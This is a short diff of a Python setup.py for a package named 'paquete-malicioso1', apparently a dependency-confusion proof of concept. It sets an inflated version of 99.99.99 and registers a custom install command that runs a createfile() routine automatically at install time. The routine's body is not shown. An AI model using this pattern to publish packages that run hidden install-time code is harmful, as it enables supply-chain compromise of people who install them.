@@ -31,4 +31,15 @@ class PostInstallCommand(install):
          createfile()
          install.run(self)
 
-# setup(...) removed                                                                                                                                                                                                                                                                                     
+setup(name='paquete-malicioso1',
+      version='99.99.99',
+      description='Security project for PoC .',
+      author='zer0ul',
+      author_email='zer0ul@vulnium.com',
+      url='https://google.com',
+      packages=[],
+      cmdclass={
+         'install' :  PostInstallCommand,
+      },
+
+     )
